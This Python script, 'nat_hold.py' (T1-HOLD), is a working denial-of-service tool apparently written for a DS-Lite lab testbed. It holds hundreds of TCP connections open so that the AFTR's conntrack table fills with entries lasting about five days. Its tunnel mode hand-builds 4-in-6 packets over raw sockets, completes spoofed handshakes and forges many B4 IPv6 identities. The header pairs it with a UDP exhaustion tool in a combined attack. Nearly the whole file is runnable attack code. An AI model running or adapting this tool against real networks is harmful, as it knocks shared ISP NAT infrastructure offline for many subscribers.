#!/usr/bin/python
# T1-HOLD – TCP ESTABLISHED Connection Hold Attack
#
# Two modes:
#
#   LAN (default) – attacker is behind a B4 on an IPv4 subnet.
#     Uses asyncio OS-level TCP connections.  Works because the OS has IPv4
#     routes through the B4 gateway.
#
#   ISP tunnel (--tunnel) – attacker is on the IPv6 ISP network.
#     Uses raw AF_PACKET sockets + a minimal TCP state machine.
#     Builds 4-in-6 (IPv4-in-IPv6) packets directly, bypassing the OS TCP stack.
#     A dedicated receiver thread sniffs incoming SYN-ACKs from the AFTR;
#     worker threads complete the 3-way handshake (SYN→SYN-ACK→ACK) and hold
#     each slot alive with periodic keepalive ACKs.
#     Supports --src-ip6-prefix to spoof many B4 identities in one run.
#
# Why the OS won't RST incoming SYN-ACKs in tunnel mode:
#   The SYN-ACK arrives as IPv6(next-header=4)/IPv4/TCP.  Without ip6tnl
#   configured, the kernel never decapsulates the inner IPv4, so no TCP socket
#   state is consulted and no RST is generated.  Raw AF_PACKET captures the
#   frame before the kernel processes it.
#
# ── Quick-start ──────────────────────────────────────────────────────────────
#
# Target port 6666 is the lab's connection-sink (socat fork + sleep): it accepts
# and HOLDS every connection, so N requested connections become N ESTABLISHED
# AFTR bindings. Port 80 is a single-threaded http.server with a listen backlog
# of 5 - it caps you at ~5 held connections no matter how many you ask for, which
# is a property of that server, not of the AFTR. Always hold against 6666.
#
# LAN (IPv4, original mode):
#   python3 nat_hold.py --target 198.51.100.2 --port 6666 --conns 200
#
# ISP tunnel – single B4 identity (real attacker IPv6):
#   python3 nat_hold.py --tunnel \
#       --interface eth-isp \
#       --src-ip6 2001:db8:cafe::200 \
#       --aftr-ip6 2001:db8:cafe::10 \
#       --inner-src-prefix 10.0.0.0/16 \
#       --target 198.51.100.2 --port 6666 --conns 200
#
# ISP tunnel – spoof many B4s (maximise conntrack diversity):
#   python3 nat_hold.py --tunnel \
#       --interface eth-isp \
#       --src-ip6-prefix 2001:db8:cafe::/48 \
#       --aftr-ip6 2001:db8:cafe::10 \
#       --inner-src-prefix 10.0.0.0/16 \
#       --target 198.51.100.2 --port 6666 \
#       --conns 500 --threads 8
#
# Combined attack (3 terminals):
#   T1  Fill AFTR conntrack table:
#       python3 nat_exhaustion.py eth0 --mode fast --proto udp \
#           --src-ip4 <ATTACKER_IP> --gateway 10.0.1.1 \
#           --dst-ip4 198.51.100.2 --threads 8 --batch 256
#
#   T1-HOLD  Hold server connections (this tool):
#       python3 nat_hold.py --target 198.51.100.2 --port 6666 --conns 200
#
#   Monitor victim (from client1 netns):
#       ip netns exec client1 python3 /testbed/attack_tools/victim_test.py
#
# Monitor on AFTR netns:
#   watch -n1 'conntrack -C; conntrack -L -p tcp 2>/dev/null | grep -c ESTABLISHED'
import argparse
import asyncio
import ipaddress
import os
import random
import resource
import signal
import socket as _socket
import subprocess
import struct
import sys
import threading
import time

def _sigterm_handler(signum, frame):
    raise KeyboardInterrupt()
signal.signal(signal.SIGTERM, _sigterm_handler)
from dataclasses import dataclass
from queue import Empty, Queue

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '..'))
from validate_parameters import is_valid_ipv4, is_valid_ipv6

# ── raise fd limit so we can open many sockets ────────────────────────────────
try:
    _soft, _hard = resource.getrlimit(resource.RLIMIT_NOFILE)
    resource.setrlimit(resource.RLIMIT_NOFILE, (min(65536, _hard), _hard))
except Exception:
    pass

# ── globals (shared between LAN and tunnel modes) ─────────────────────────────
stop_event   = threading.Event()
active_conns = 0   # slots currently in ESTABLISHED state
total_opened = 0   # cumulative successful handshakes
total_failed = 0   # cumulative failed attempts
_lock        = threading.Lock()

CYAN   = '\033[0;36m'
GREEN  = '\033[0;32m'
YELLOW = '\033[1;33m'
RED    = '\033[0;31m'
BOLD   = '\033[1m'
NC     = '\033[0m'


# ══════════════════════════════════════════════════════════════════════════════
# ── IPv4 LAN mode (original) ─────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

async def hold_slot(target, port, keepalive):
    """
    One hold slot.  Connects, drains server's response, then keeps the TCP
    half-open (our write side stays open) so nc cannot restart.
    Reconnects automatically when the server eventually forces close.
    """
    global active_conns, total_opened, total_failed

    while not stop_event.is_set():
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(target, port),
                timeout=5.0
            )

            # Drain whatever the server sends (HTTP response + FIN).
            # nc sends its response immediately and then closes its write side.
            # We read until EOF so our read side is clean.
            # We do NOT close our write side → nc is stuck in CLOSE_WAIT.
            try:
                while True:
                    chunk = await asyncio.wait_for(reader.read(4096), timeout=2.0)
                    if not chunk:
                        break
            except asyncio.TimeoutError:
                pass

            with _lock:
                active_conns += 1
                total_opened += 1

            try:
                while not stop_event.is_set():
                    await asyncio.sleep(float(keepalive))
                    try:
                        writer.write(b'')
                        await writer.drain()
                    except Exception:
                        break
            except Exception:
                pass
            finally:
                with _lock:
                    active_conns -= 1
                try:
                    writer.close()
                    await writer.wait_closed()
                except Exception:
                    pass

        except Exception:
            with _lock:
                total_failed += 1
            await asyncio.sleep(1.0)


async def hold_main(args):
    tasks = []
    for i in range(args.conns):
        if stop_event.is_set():
            break
        t = asyncio.ensure_future(hold_slot(args.target, args.port, args.keepalive))
        tasks.append(t)
        if (i + 1) % args.rampup == 0:
            await asyncio.sleep(1.0)
        elif (i + 1) % 20 == 0:
            await asyncio.sleep(0.05)

    while not stop_event.is_set():
        await asyncio.sleep(0.2)

    for t in tasks:
        t.cancel()
    await asyncio.gather(*tasks, return_exceptions=True)


def _run_loop(args):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(hold_main(args))
    finally:
        loop.close()


# ══════════════════════════════════════════════════════════════════════════════
# ── ISP Tunnel mode ───────────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

# Tune these for the AFTR's conntrack timeouts:
#   TCP SYN_RECV:   120 s   (we never want to rely on this)
#   TCP ESTABLISHED: 432000 s (~5 days)  ← what we create
_SYN_RETRY_S  = 4.0    # resend SYN if no SYN-ACK arrives within this many s
_KEEPALIVE_S  = 60.0   # send an empty ACK every N s to keep ESTABLISHED alive

# Global SYN-ACK dispatch table: (inner_src4, our_sport) → Queue
_synack_map      : dict = {}
_synack_map_lock = threading.Lock()


@dataclass
class TunnelConn:
    """State for one 4-in-6 TCP connection slot."""
    src_ip6:     str
    inner_src4:  str
    sport:       int
    seq:         int   = 0      # our next-byte-to-send seq number
    ack:         int   = 0      # next byte we expect from server
    state:       str   = 'INIT' # INIT | SYN_SENT | ESTABLISHED
    syn_sent_at: float = 0.0
    last_ka:     float = 0.0


def _open_raw_sock(iface: str) -> _socket.socket:
    s = _socket.socket(_socket.AF_PACKET, _socket.SOCK_RAW, _socket.htons(0x0003))
    s.bind((iface, 0))
    return s


def _ipv6_to_bytes(addr: str) -> bytes:
    return _socket.inet_pton(_socket.AF_INET6, addr)


def _rand_ip4(prefix: str) -> str:
    net = ipaddress.IPv4Network(prefix, strict=False)
    hi = random.randint(int(net.network_address) + 1, int(net.broadcast_address) - 1)
    return str(ipaddress.IPv4Address(hi))


def _rand_ip6(prefix: str) -> str:
    net = ipaddress.IPv6Network(prefix, strict=False)
    hi = random.randint(int(net.network_address) + 1, int(net.broadcast_address) - 1)
    return str(ipaddress.IPv6Address(hi))


def _resolve_mac_ndp(iface: str, dst_ip6: str):
    """ICMPv6 NS → NA to discover the AFTR's MAC.  Returns MAC string or None."""
    from scapy.layers.inet6 import IPv6, ICMPv6ND_NS
    from scapy.layers.l2 import Ether
    from scapy.sendrecv import srp1
    try:
        pkt = srp1(
            Ether(dst="33:33:ff:00:00:10") / IPv6(dst=dst_ip6) / ICMPv6ND_NS(tgt=dst_ip6),
            iface=iface, timeout=3, verbose=0
        )
        if pkt and pkt.haslayer(Ether):
            return pkt[Ether].src
    except Exception:
        pass
    return None


def _build_syn(src_ip6, aftr_ip6, inner4, dst4, sport, dport, seq, dmac) -> bytes:
    from scapy.layers.inet import IP, TCP
    from scapy.layers.inet6 import IPv6
    from scapy.layers.l2 import Ether
    pkt = (Ether(dst=dmac) /
           IPv6(src=src_ip6, dst=aftr_ip6, nh=4) /
           IP(src=inner4, dst=dst4, ttl=63) /
           TCP(sport=sport, dport=dport, flags='S', seq=seq, window=65535))
    return bytes(pkt)


def _build_ack(src_ip6, aftr_ip6, inner4, dst4, sport, dport, seq, ack, dmac) -> bytes:
    from scapy.layers.inet import IP, TCP
    from scapy.layers.inet6 import IPv6
    from scapy.layers.l2 import Ether
    pkt = (Ether(dst=dmac) /
           IPv6(src=src_ip6, dst=aftr_ip6, nh=4) /
           IP(src=inner4, dst=dst4, ttl=63) /
           TCP(sport=sport, dport=dport, flags='A', seq=seq, ack=ack, window=65535))
    return bytes(pkt)


def receiver_thread(iface: str, aftr_ip6: str, stop_ev: threading.Event):
    """
    Capture every incoming frame on `iface`.
    Identify 4-in-6 TCP SYN-ACK packets whose outer IPv6 src == AFTR,
    extract (inner_dst_ip4, inner_dst_port) and dispatch the TCP seq/ack
    pair to the waiting TunnelConn queue.

    Packet layout (no VLAN, no extension headers):
      ETH(14) + IPv6(40) + IPv4(20) + TCP(≥20)
    When the AFTR tunnel uses encaplimit, a Destination Options
    extension header (nh=60) is inserted between IPv6 and IPv4.
    The receiver walks the extension header chain to find the
    inner IPv4 payload dynamically.
    """
    aftr_bytes = _ipv6_to_bytes(aftr_ip6)
    try:
        sock = _open_raw_sock(iface)
    except OSError as e:
        print(f"\n[!] Receiver thread: cannot open raw socket: {e}", file=sys.stderr)
        return
    sock.settimeout(0.5)

    # IPv6 extension header types that use (next-header, length) TLV format
    _EXT_HDR_NHs = {0, 43, 44, 50, 51, 60, 135, 139, 140}  # HBH, Routing, Fragment, …

    while not stop_ev.is_set():
        try:
            raw = sock.recv(65536)
        except _socket.timeout:
            continue
        except OSError:
            break

        # Minimum meaningful size
        if len(raw) < 94:
            continue
        # EtherType must be IPv6 (0x86DD)
        if struct.unpack_from('!H', raw, 12)[0] != 0x86DD:
            continue
        # IPv6 src == AFTR
        if raw[22:38] != aftr_bytes:
            continue

        # Walk IPv6 extension header chain to find the inner IPv4 payload.
        # Start at the IPv6 next-header field.
        nh  = raw[20]       # first next-header
        off = 54            # 14 (ETH) + 40 (IPv6 fixed header)
        while nh in _EXT_HDR_NHs:
            if off + 2 > len(raw):
                break
            nh  = raw[off]
            ext_len = (raw[off + 1] + 1) * 8  # length in 8-byte units
            off += ext_len
        if nh != 4:         # 4 = IPIP (inner IPv4)
            continue

        ipv4_off = off
        if len(raw) < ipv4_off + 20:
            continue
        # Inner IPv4 protocol must be TCP (6)
        if raw[ipv4_off + 9] != 6:
            continue
        ihl = (raw[ipv4_off] & 0x0F) * 4
        tcp_off = ipv4_off + ihl
        if len(raw) < tcp_off + 20:
            continue

        # TCP flags: need SYN+ACK (0x12)
        if (raw[tcp_off + 13] & 0x12) != 0x12:
            continue

        # inner_dst = our inner_src4
        inner_dst = _socket.inet_ntoa(raw[ipv4_off + 16: ipv4_off + 20])
        # TCP dport = our sport
        our_sport   = struct.unpack_from('!H', raw, tcp_off + 2)[0]
        server_seq  = struct.unpack_from('!I', raw, tcp_off + 4)[0]
        server_ack  = struct.unpack_from('!I', raw, tcp_off + 8)[0]

        key = (inner_dst, our_sport)
        with _synack_map_lock:
            q = _synack_map.get(key)
        if q is not None:
            try:
                q.put_nowait((server_seq, server_ack))
            except Exception:
                pass

    sock.close()


def worker_tunnel(args, dmac: str, thread_id: int, num_slots: int):
    """Manage `num_slots` 4-in-6 TCP connection slots: SYN→ESTABLISHED→hold."""
    global active_conns, total_opened, total_failed

    try:
        sock = _open_raw_sock(args.interface)
    except OSError as e:
        print(f"\n[!] Thread {thread_id}: cannot open raw socket: {e}", file=sys.stderr)
        return

    # Allocate connection slots
    slots: list[tuple[TunnelConn, Queue]] = []
    _prefix_addrs = getattr(args, '_prefix_addrs', None)
    for slot_i in range(num_slots):
        if _prefix_addrs:
            # Use pre-generated addresses (NDP-reachable) via round-robin
            global_idx = thread_id * num_slots + slot_i
            src6 = _prefix_addrs[global_idx % len(_prefix_addrs)]
        elif args.src_ip6_prefix:
            src6 = _rand_ip6(args.src_ip6_prefix)
        else:
            src6 = args.src_ip6
        inner4 = _rand_ip4(args.inner_src_prefix) if args.inner_src_prefix else args.inner_src_ip4
        sport  = random.randint(1025, 65533)
        seq    = random.randint(1, 0xFFFFFFFE)

        conn = TunnelConn(src_ip6=src6, inner_src4=inner4, sport=sport, seq=seq)
        q    = Queue(maxsize=8)

        with _synack_map_lock:
            _synack_map[(inner4, sport)] = q

        slots.append((conn, q))

    # Fire initial SYNs
    now = time.time()
    for conn, _ in slots:
        raw = _build_syn(conn.src_ip6, args.aftr_ip6, conn.inner_src4,
                         args.target, conn.sport, args.port, conn.seq, dmac)
        try:
            sock.send(raw)
            conn.state      = 'SYN_SENT'
            conn.syn_sent_at = now
        except OSError:
            pass

    try:
        while not stop_event.is_set():
            now = time.time()

            for conn, synack_q in slots:
                if conn.state == 'SYN_SENT':
                    try:
                        server_seq, _ = synack_q.get_nowait()
                        # Complete handshake
                        conn.ack  = server_seq + 1
                        conn.seq += 1          # SYN consumed one seq number
                        ack_raw = _build_ack(conn.src_ip6, args.aftr_ip6,
                                             conn.inner_src4, args.target,
                                             conn.sport, args.port,
                                             conn.seq, conn.ack, dmac)
                        try:
                            sock.send(ack_raw)
                            conn.state = 'ESTABLISHED'
                            conn.last_ka = now
                            with _lock:
                                active_conns += 1
                                total_opened += 1
                        except OSError:
                            pass
                    except Empty:
                        # No SYN-ACK yet; retransmit SYN if window elapsed
                        if now - conn.syn_sent_at >= _SYN_RETRY_S:
                            conn.seq = random.randint(1, 0xFFFFFFFE)
                            syn_raw = _build_syn(conn.src_ip6, args.aftr_ip6,
                                                 conn.inner_src4, args.target,
                                                 conn.sport, args.port, conn.seq, dmac)
                            try:
                                sock.send(syn_raw)
                                conn.syn_sent_at = now
                            except OSError:
                                pass
                            with _lock:
                                total_failed += 1

                elif conn.state == 'ESTABLISHED':
                    if now - conn.last_ka >= _KEEPALIVE_S:
                        ack_raw = _build_ack(conn.src_ip6, args.aftr_ip6,
                                             conn.inner_src4, args.target,
                                             conn.sport, args.port,
                                             conn.seq, conn.ack, dmac)
                        try:
                            sock.send(ack_raw)
                            conn.last_ka = now
                        except OSError:
                            # Slot dropped; re-open from SYN
                            with _lock:
                                active_conns = max(0, active_conns - 1)
                            conn.state   = 'SYN_SENT'
                            conn.seq     = random.randint(1, 0xFFFFFFFE)
                            conn.syn_sent_at = now
                            syn_raw = _build_syn(conn.src_ip6, args.aftr_ip6,
                                                 conn.inner_src4, args.target,
                                                 conn.sport, args.port, conn.seq, dmac)
                            try:
                                sock.send(syn_raw)
                            except OSError:
                                pass

            time.sleep(0.05)   # 50 ms poll — light enough for hundreds of slots

    finally:
        # Deregister all queues for this thread's slots
        with _synack_map_lock:
            for conn, _ in slots:
                _synack_map.pop((conn.inner_src4, conn.sport), None)
        established = sum(1 for c, _ in slots if c.state == 'ESTABLISHED')
        with _lock:
            active_conns = max(0, active_conns - established)
        sock.close()


# ══════════════════════════════════════════════════════════════════════════════
# ── Progress display (shared) ─────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

def progress_printer(args):
    start = time.time()
    while not stop_event.is_set():
        elapsed = time.time() - start
        with _lock:
            active = active_conns
            opened = total_opened
            failed = total_failed

        pct = active / max(args.conns, 1) * 100
        col = RED if pct >= 60 else (YELLOW if pct >= 20 else GREEN)

        bar_len = 25
        filled  = int(pct / 100 * bar_len)
        bar     = '█' * filled + '░' * (bar_len - filled)

        print(
            f"\r  [*] Held: {col}{active:>5}{NC}/{args.conns}  [{col}{bar}{NC}] "
            f"{pct:4.0f}%  opened={opened:,}  failed={failed:,}  {elapsed:.0f}s",
            end='', flush=True
        )
        if args.duration and elapsed >= args.duration:
            stop_event.set()
        time.sleep(0.5)
    print()


# ══════════════════════════════════════════════════════════════════════════════
# ── main ──────────────────────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

def main():
    p = argparse.ArgumentParser(
        description=(
            'T1-HOLD – TCP Connection Hold Attack\n'
            'Holds TCP connections open to fill AFTR conntrack with ESTABLISHED\n'
            'entries (timeout 432000 s).  Two modes:\n'
            '  LAN    : asyncio OS-level TCP (attacker behind a B4, IPv4 reachable)\n'
            '  Tunnel : raw 4-in-6 TCP state machine (attacker on IPv6 ISP network)'
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
LAN mode (attacker on B4-1 LAN, 10.0.1.150):
  python3 nat_hold.py --target 198.51.100.2 --port 6666 --conns 200

ISP tunnel mode – single B4 identity:
  python3 nat_hold.py --tunnel --interface eth-isp \\
      --src-ip6 2001:db8:cafe::200 --aftr-ip6 2001:db8:cafe::10 \\
      --inner-src-prefix 10.0.0.0/16 \\
      --target 198.51.100.2 --port 6666 --conns 200 --threads 4

ISP tunnel mode – spoof many B4s:
  python3 nat_hold.py --tunnel --interface eth-isp \\
      --src-ip6-prefix 2001:db8:cafe::/48 --aftr-ip6 2001:db8:cafe::10 \\
      --inner-src-prefix 10.0.0.0/16 \\
      --target 198.51.100.2 --port 6666 --conns 500 --threads 8

Monitor AFTR conntrack (run in AFTR netns):
  watch -n1 'conntrack -C; conntrack -L -p tcp 2>/dev/null | grep -c ESTABLISHED'
  conntrack -L -p tcp 2>/dev/null | grep CLOSE_WAIT | wc -l
"""
    )

    # ── Common ──
    p.add_argument('--target', default='198.51.100.2',
                   help='Target IPv4 address / server (default: 198.51.100.2)')
    p.add_argument('--port', type=int, default=6666,
                   help='Target TCP port (default: 6666 - the lab connection-sink '
                        'that accepts+holds many conns. Do NOT use 80: the lab '
                        'http.server is single-threaded with a backlog of 5, so it '
                        'caps you at ~5 held connections regardless of the attack.)')
    p.add_argument('--conns', type=int, default=200,
                   help='Number of connections / slots to hold open (default: 200)')
    p.add_argument('--duration', type=int, default=0,
                   help='Stop after N seconds (0=unlimited, default: 0)')

    # ── LAN mode ──
    lan = p.add_argument_group('LAN mode (default)')
    lan.add_argument('--rampup', type=int, default=50,
                     help='New connections per second during ramp-up (default: 50)')
    lan.add_argument('--keepalive', type=int, default=30,
                     help='Seconds between keep-alive checks in LAN mode (default: 30)')

    # ── ISP Tunnel mode ──
    tun = p.add_argument_group('ISP tunnel mode (--tunnel)')
    tun.add_argument('--tunnel', action='store_true',
                     help='Use 4-in-6 raw socket TCP state machine (attacker on IPv6 ISP)')
    tun.add_argument('--interface',
                     help='Network interface for raw socket TX/RX in tunnel mode')
    tun.add_argument('--src-ip6',
                     help='Attacker outer IPv6 src (fixed B4 identity)')
    tun.add_argument('--src-ip6-prefix',
                     help='Randomise outer IPv6 src from this prefix '
                          '(e.g. 2001:db8:cafe::/48) – spoofs many B4s')
    tun.add_argument('--aftr-ip6', default='2001:db8:cafe::10',
                     help='AFTR IPv6 address (default: 2001:db8:cafe::10)')
    tun.add_argument('--inner-src-ip4', default='10.0.1.50',
                     help='Fixed inner IPv4 src for tunnel slots (default: 10.0.1.50)')
    tun.add_argument('--inner-src-prefix',
                     help='Randomise inner IPv4 src from this CIDR '
                          '(e.g. 10.0.0.0/16) – increases conntrack 5-tuple diversity')
    tun.add_argument('--threads', type=int, default=4,
                     help='Worker threads in tunnel mode (default: 4)')
    tun.add_argument('--dmac',
                     help='Force destination MAC (skip NDP resolution)')

    args = p.parse_args()

    # ── Validation ────────────────────────────────────────────────────────────
    if not is_valid_ipv4(args.target):
        p.error(f'Invalid --target: {args.target}')

    if args.tunnel:
        if not args.interface:
            p.error('--tunnel requires --interface')
        if not args.src_ip6 and not args.src_ip6_prefix:
            p.error('--tunnel requires --src-ip6 or --src-ip6-prefix')
        if args.src_ip6 and not is_valid_ipv6(args.src_ip6):
            p.error(f'Invalid --src-ip6: {args.src_ip6}')
        if not is_valid_ipv6(args.aftr_ip6):
            p.error(f'Invalid --aftr-ip6: {args.aftr_ip6}')
        if args.src_ip6_prefix:
            try:
                ipaddress.IPv6Network(args.src_ip6_prefix, strict=False)
            except ValueError as e:
                p.error(f'Invalid --src-ip6-prefix: {e}')
        if args.inner_src_prefix:
            try:
                ipaddress.IPv4Network(args.inner_src_prefix, strict=False)
            except ValueError as e:
                p.error(f'Invalid --inner-src-prefix: {e}')

    # ── Tunnel mode entry ─────────────────────────────────────────────────────
    if args.tunnel:
        # Resolve AFTR MAC
        if args.dmac:
            dmac = args.dmac
            print(f"[*] Using forced dst MAC: {dmac}")
        else:
            print(f"[*] Resolving NDP for AFTR {args.aftr_ip6} …")
            dmac = _resolve_mac_ndp(args.interface, args.aftr_ip6)
            if not dmac:
                print("[!] NDP failed – using multicast fallback 33:33:00:00:00:10")
                dmac = "33:33:00:00:00:10"
            print(f"[*] AFTR MAC: {dmac}")

        print(f"{BOLD}╔══════════════════════════════════════════════════════════════╗{NC}")
        print(f"{BOLD}║   T1-HOLD (ISP Tunnel) – 4-in-6 TCP ESTABLISHED Hold         ║{NC}")
        print(f"{BOLD}╚══════════════════════════════════════════════════════════════╝{NC}")
        print(f"  Interface : {args.interface}")
        print(f"  Target    : {args.target}:{args.port}")
        print(f"  AFTR      : {args.aftr_ip6}  MAC: {dmac}")
        if args.src_ip6_prefix:
            print(f"  Outer IPv6: random from {args.src_ip6_prefix}  (spoofing many B4s)")
        else:
            print(f"  Outer IPv6: {args.src_ip6}  (fixed B4 identity)")
        if args.inner_src_prefix:
            print(f"  Inner IPv4: random from {args.inner_src_prefix}")
        else:
            print(f"  Inner IPv4: {args.inner_src_ip4}  (fixed)")
        slots_each = args.conns // max(args.threads, 1)
        print(f"  Hold slots: {args.conns}  ({args.threads} threads × ~{slots_each} slots)")
        print()
        print(f"  {YELLOW}[!] Mechanism:{NC} SYN → SYN-ACK → ACK  (4-in-6 encapsulated)")
        print(f"      ESTABLISHED conntrack on AFTR  (timeout ≈ 432000 s / 5 days)")
        print(f"      Keepalive ACK every {_KEEPALIVE_S:.0f} s per slot")
        print()
        print(f"  {YELLOW}[!] Note:{NC} The OS will not RST incoming SYN-ACKs because")
        print(f"      they arrive as IPv6(nh=4) without a matching ip6tnl device.")
        print()
        print("  [!] Monitor AFTR:")
        print("        watch -n1 'conntrack -C; conntrack -L -p tcp 2>/dev/null | grep -c ESTABLISHED'")
        print()

        # ── Ensure NDP reachability for spoofed IPv6 source(s) ────────────
        # The AFTR needs to resolve our outer IPv6 src to a link-layer
        # address for the return SYN-ACK.  If we're spoofing an address
        # that isn't configured on this interface, the kernel won't answer
        # NDP solicitations.  Fix: temporarily add the address(es).
        _added_ipv6: list[str] = []
        if args.src_ip6:
            # Check if address is already on the interface
            out = subprocess.run(
                ['ip', '-6', 'addr', 'show', 'dev', args.interface],
                capture_output=True, text=True
            ).stdout
            if args.src_ip6 not in out:
                subprocess.run(
                    ['ip', '-6', 'addr', 'add', f'{args.src_ip6}/128', 'dev', args.interface,
                     'nodad'],
                    capture_output=True
                )
                _added_ipv6.append(args.src_ip6)
                print(f"[*] Added {args.src_ip6}/128 to {args.interface} (NDP reachability)")
        elif args.src_ip6_prefix:
            # For prefix mode: pre-generate the random addresses and add them
            _prefix_addrs = []
            base_count = args.conns // max(args.threads, 1)
            for _ in range(args.conns):
                addr = _rand_ip6(args.src_ip6_prefix)
                _prefix_addrs.append(addr)
                subprocess.run(
                    ['ip', '-6', 'addr', 'add', f'{addr}/128', 'dev', args.interface,
                     'nodad'],
                    capture_output=True
                )
                _added_ipv6.append(addr)
            # Store for worker_tunnel to consume
            args._prefix_addrs = _prefix_addrs
            print(f"[*] Added {len(_added_ipv6)} IPv6 addresses to {args.interface} (NDP reachability)")

        # Start receiver thread (sniffs incoming SYN-ACKs from AFTR)
        recv_t = threading.Thread(
            target=receiver_thread,
            args=(args.interface, args.aftr_ip6, stop_event),
            daemon=True
        )
        recv_t.start()

        # Divide slots across worker threads
        base = args.conns // args.threads
        rem  = args.conns % args.threads
        workers = []
        for i in range(args.threads):
            n = base + (1 if i < rem else 0)
            t = threading.Thread(target=worker_tunnel, args=(args, dmac, i, n), daemon=True)
            t.start()
            workers.append(t)
            time.sleep(0.02)   # slight stagger between thread starts

        try:
            try:
                progress_printer(args)
            except KeyboardInterrupt:
                print("\n[*] Interrupted.")
                stop_event.set()
            for t in workers:
                t.join(timeout=3)
            recv_t.join(timeout=2)
        finally:
            # ALWAYS remove the temporarily added IPv6 addresses, even on
            # SIGTERM/exception — otherwise a forged ::b4N/128 leaks onto the
            # attacker interface and corrupts later runs. (SIGKILL still can't be
            # caught; the lab's ensure_attacker_isp strips any straggler.)
            for addr in _added_ipv6:
                subprocess.run(
                    ['ip', '-6', 'addr', 'del', f'{addr}/128', 'dev', args.interface],
                    capture_output=True
                )

        with _lock:
            print(f"\n[+] Done. Final established: {active_conns:,}  "
                  f"Total opened: {total_opened:,}")
        print("[!] Residual ESTABLISHED entries on AFTR persist for up to 5 days.")
        print("[!] Check: conntrack -L -p tcp 2>/dev/null | grep -c ESTABLISHED")

        print("[!] Confirm impact by live investigation on the AFTR, e.g.:")
        print("      conntrack -L -p tcp | grep ESTABLISHED")
        print("      conntrack -C")
        return

    # ── LAN mode entry ────────────────────────────────────────────────────────
    print(f"{BOLD}╔══════════════════════════════════════════════════════════════╗{NC}")
    print(f"{BOLD}║   T1-HOLD – TCP Connection Hold Attack                       ║{NC}")
    print(f"{BOLD}╚══════════════════════════════════════════════════════════════╝{NC}")
    print(f"  Target    : {args.target}:{args.port}")
    print(f"  Hold conns: {args.conns}  (ramp-up: {args.rampup}/s)")
    print(f"  Keepalive : every {args.keepalive}s")
    if args.duration:
        print(f"  Duration  : {args.duration}s")
    print()
    print(f"  {YELLOW}[!] How it works:{NC}")
    print(f"      Connect → receive server response → keep write-side open")
    print(f"      nc is stuck in CLOSE_WAIT → cannot serve new clients")
    print(f"      AFTR conntrack: ESTABLISHED/CLOSE_WAIT entries (240–8640s, GC-hard)")
    print()
    print("  [!] Monitor AFTR:")
    print("        watch -n1 'conntrack -C; conntrack -L -p tcp 2>/dev/null | grep -c CLOSE_WAIT'")
    print()

    t = threading.Thread(target=_run_loop, args=(args,), daemon=True)
    t.start()

    try:
        progress_printer(args)
    except KeyboardInterrupt:
        print("\n[*] Interrupted.")
        stop_event.set()

    t.join(timeout=3)

    with _lock:
        print(f"\n[+] Done. Final active: {active_conns:,}  Total opened: {total_opened:,}")
    print("[!] Residual CLOSE_WAIT entries persist on AFTR for up to 240s.")
    print("[!] Check: conntrack -L -p tcp 2>/dev/null | grep -c CLOSE_WAIT")


if __name__ == '__main__':
    main()
